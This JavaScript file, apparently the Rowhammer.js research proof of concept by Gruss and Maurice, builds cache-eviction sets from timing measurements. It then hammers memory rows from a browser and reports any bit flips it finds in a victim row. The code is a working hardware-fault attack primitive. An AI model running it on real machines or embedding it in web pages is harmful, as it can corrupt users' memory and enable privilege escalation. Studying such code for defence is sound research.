// Copyright 2015, Daniel Gruss, Clémentine Maurice
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
stop = 0;
function allocate()
{
  if (stop == 1)
    return;
  do
  {
    array[alloci] = alloci/4096;
    alloci += 4096;
  } while ((alloci % (2*1024*1024)) != 0);
  //document.getElementById("text").innerHTML += (alloci/1024/1024) + "<br />";
  setTimeout(allocate, 10);
}
function start()
{
  if (stop == 1)
    return;
  setTimeout(allocate, 50);
}
function stopa()
{
  stop = 1;
}
var darray = new DataView(array.buffer);
function fillrandom()
{
  for (var i = 0; i < 63; i += 1)
  {
    array[f[i]] = Math.random()*256 | 0;
    array[s[i]] = Math.random()*256 | 0;
  }
}

function check(sum)
{
  if (sum == 0)
    document.getElementById("text").innerHTML += "<br/>[!] sum is " + sum + "(should never happen)<br/>";
  var flip = 0;
  for  (var i = v[0]; i < v[1]; i++) {
    if (array[i] != 255)
    {
      document.getElementById("text").innerHTML += "<br />[!] Found flip (" + array[i] + " != 255) at array index " + i + " when hammering indices " + f[0] + " and " + s[0] + "<br/>";
      array[i] = 255;
    }
  }
  fillrandom();
  if (flip == 0)
    setTimeout(hammer_second_row, 10);
}
function cached(arr)
{
  if (hammering == 0)
    return;
  hist = Array(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
  var N = 1000;
  while (N-- > 0) {
    for (var i = 1; i < arr.length-1; i += 1)
    {
      sum += array[arr[i]];
      sum += array[arr[i+1]];
      sum += array[arr[i]];
      sum += array[arr[i+1]];

    }
    var t1 = window.performance.now();
    sum += array[arr[0]];
    var t2 = window.performance.now();

    if (Math.round((t2 - t1) * 50000.0,0) > 15)
      hist[15] += 1;
    else if (hist[Math.round((t2 - t1) * 50000.0,0)] > 0)
      hist[Math.round((t2 - t1) * 50000.0,0)] += 1;
    else
      hist[Math.round((t2 - t1) * 50000.0,0)] = 1;
  }
  var t2 = window.performance.now();
/*  document.getElementById("histogram").innerHTML = "";
  for (var i = 0; i <= 15; i++)
    document.getElementById("histogram").innerHTML += (i*20) + ": " + hist[i] + "<br />";*/
  if ((hist[0]+hist[1]+hist[2]) > 0)
  {
    return true;
  }
  return false;
}
function reducef()
{
  if (hammering == 0)
    return;
  if (f.length > 38)
  {
    var tmp = f[1];
    f.splice(1,1);
    if (cached(f))
    {
      f.push(tmp);
    }
    else
      document.getElementById("text").innerHTML += "- ";
      //document.getElementById("text").innerHTML += "removed " + tmp + "<br />";
    //document.getElementById("text").innerHTML += "f " + f.length;
    setTimeout(reducef, 100);
  }
  else
  {
    document.getElementById("text").innerHTML += "<br />";
    setTimeout(hammer_second_row, 100);
  }
}
function reduces()
{
  if (hammering == 0)
    return;
  if (s.length > 38)
  {
    var tmp = s[1];
    s.splice(1,1);
    if (cached(s))
    {
      s.push(tmp);
    }
    //document.getElementById("text").innerHTML += "s " + s.length;
    setTimeout(reduces, 100);
  }
  else
  {
    //document.getElementById("text").innerHTML += "<br />";
    setTimeout(hammer_single, 100);
  }
}
var eviction_addrs = 0;
var seviction_addrs = 0;
function pickf()
{
  eviction_addrs = 4*37+1;
  for (var i = 1; i < eviction_addrs; ++i)
  {
    f[i] = f[0] + 128 * 1024 + i * 128 * 1024;
    document.getElementById("text").innerHTML += "+ ";
    //document.getElementById("text").innerHTML += "added " + f[i] + "<br />";
  }
  fillrandom();
  reducef();
}
function picks()
{
  var seviction_addrs = 4*37+1;
  for (var i = 1; i < seviction_addrs; ++i)
  {
    s[i] = s[0] + i * 128 * 1024;
  }
  fillrandom();
  reduces();
}
function hammer_single()
{
  
  var sum = Math.random()*256 | 0;
  var number_of_reads = parseInt(document.getElementById("number_of_reads").value) | 0;
  if (number_of_reads == 0)
    return;

  var t0 = window.performance.now();
  while (number_of_reads-- > 0) {
    //var t1 = window.performance.now()/10.0;
    for (var i = 1; i < 36; i += 1)
    {
      sum += array[f[i]];
      sum += array[s[i]];
      sum += array[f[i+1]];
      sum += array[s[i+1]];
      sum += array[f[i]];
      sum += array[s[i]];
      sum += array[f[i+1]];
      sum += array[s[i+1]];
    }
    //var t2 = window.performance.now()/10.0;
    /*for (var i = 0; i < 8*1024*1024; i += 1)
    {
      sum += array[i];
    }*/
    var t1 = window.performance.now();
    sum += array[f[0]];
    sum += array[s[0]];
    var t2 = window.performance.now();

    if (Math.round((t2 - t1) * 50000.0,0) > 15)
      hist[15] += 1;
    else if (hist[Math.round((t2 - t1) * 50000.0,0)] > 0)
      hist[Math.round((t2 - t1) * 50000.0,0)] += 1;
    else
      hist[Math.round((t2 - t1) * 50000.0,0)] = 1;
  }
  var t2 = window.performance.now();
  document.getElementById("histogram").innerHTML = "";
  document.getElementById("histogram").innerHTML += "sum("+sum + ")";
  document.getElementById("histogram").innerHTML += "*f("+array[f[0]] + ")";
  document.getElementById("histogram").innerHTML += "v("+v[0] + ")";
  document.getElementById("histogram").innerHTML += "f("+f[0] + ")";
  document.getElementById("histogram").innerHTML += "s("+s[0]+")<br />";
  for (var i = 0; i <= 15; i++)
    document.getElementById("histogram").innerHTML += (i*20) + ": " + hist[i] + "<br />";
  hist = Array(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);

  document.getElementById("text").innerHTML += " " + Math.round((t2 - t0) * 1000000.0/parseInt(document.getElementById("number_of_reads").value),0);
  check(sum);
}
var row_number = -1;
var row_size = 128*1024;
var foffset = 0;
var soffset = 0;
var hammering = 0;
function hammer()
{
  if (hammering++ != 0)
    return;
  row_number++;
  foffset = -4096;
  v[0] = (row_number + 1) * row_size;
  v[1] = (row_number + 2) * row_size;
  for  (var i = v[0]; i <= v[1]; i++)
    array[i] = 255;
  document.getElementById("text").innerHTML += "<br/>[!] Hammering 128K offsets "+ row_number +" and "+ (row_number + 2) +"<br/>";
  hammer_first_row();
}
function hammer_first_row()
{
  foffset += 4096;
  if (foffset < row_size)
  {
    f[0] = (row_number + 0) * row_size + foffset;
    soffset = -4096;
    pickf();
  }
  else
  {
    setTimeout(hammer, 10);
  }
}
function hammer_second_row()
{
  if (hammering == 0)
    return;
  soffset += 4096;
  if (soffset < row_size)
  {
    s[0] = (row_number + 2) * row_size + soffset;
    picks();
  }
  else
  {
    setTimeout(hammer_first_row, 10);
  }
}
document.getElementById("histogram").innerHTML = "";
document.getElementById("text").innerHTML = "";

